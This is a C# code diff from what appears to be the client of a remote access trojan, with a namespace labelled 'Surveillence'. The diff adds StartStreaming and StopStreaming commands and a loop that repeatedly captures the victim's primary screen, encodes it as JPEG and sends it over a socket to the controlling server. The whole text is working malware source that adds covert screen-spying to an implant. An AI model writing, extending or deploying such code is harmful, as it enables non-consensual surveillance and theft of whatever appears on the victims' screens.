@@ -17,6 +17,7 @@ namespace Axeno.Client.Networking.Functions.Surveillence
 {
     internal class RemoteDesktop
     {
+        public static bool streaming = false;
         public static void HandlePacket(MsgPack msgpack)
         {
             string command = msgpack.ForcePathObject("Option").AsString;
@@ -27,21 +28,21 @@ namespace Axeno.Client.Networking.Functions.Surveillence
                         SendRDPInfo();
                         break;
                     }
-                //case "startRDP":
-                //    {
-                //        int quality = Convert.ToInt32(msgpack.ForcePathObject("Quality").AsString);
-                //        int screen = Convert.ToInt32(msgpack.ForcePathObject("Screen").AsString);
-                //        if (!RDPon)
-                //        {
-                //            RDPon = true;
-                //            CaptureRDP(quality, screen);
-                //        }
-                //        break;
-                //    }
-                //case "stopRDP":
-                //    {
-                //        break;
-                //    }
+                case "StartStreaming":
+                    {
+                        streaming = true;
+                        new Task(() =>
+                        {
+                            StartStreaming();
+
+                        }).Start();
+                        break;
+                    }
+                case "StopStreaming":
+                    {
+                        streaming = false;
+                        break;
+                    }
             }
 
         }
@@ -51,6 +52,35 @@ namespace Axeno.Client.Networking.Functions.Surveillence
             msgpack.ForcePathObject("Packet").AsString = "RemoteDesktopInformation";
             msgpack.ForcePathObject("Screens").AsInteger = Convert.ToInt32(Screen.AllScreens.Length);
             ClientSocket.Send(msgpack.Encode2Bytes());
+        }
+        public static void StartStreaming()
+        {
+            while (streaming)
+            {
+                try
+                {
+                    Bitmap bmpScreen = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
+                    Graphics g = Graphics.FromImage(bmpScreen);
+                    g.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, bmpScreen.Size, CopyPixelOperation.SourceCopy);
+
+                    byte[] desktopData;
+                    using (MemoryStream ms = new MemoryStream())
+                    {
+                        bmpScreen.Save(ms, ImageFormat.Jpeg);
+                        desktopData = ms.ToArray();
+                    }
+
+                    MsgPack msgpack = new MsgPack();
+                    msgpack.ForcePathObject("Packet").AsString = "DesktopStream";
+                    msgpack.ForcePathObject("Stream").SetAsBytes(desktopData);
+
+                    ClientSocket.Send(msgpack.Encode2Bytes());
+                }catch
+                {
+                    streaming = false;
+                    ClientSocket.IsConnected= false;
+                }
+            }
         }
     }
 }
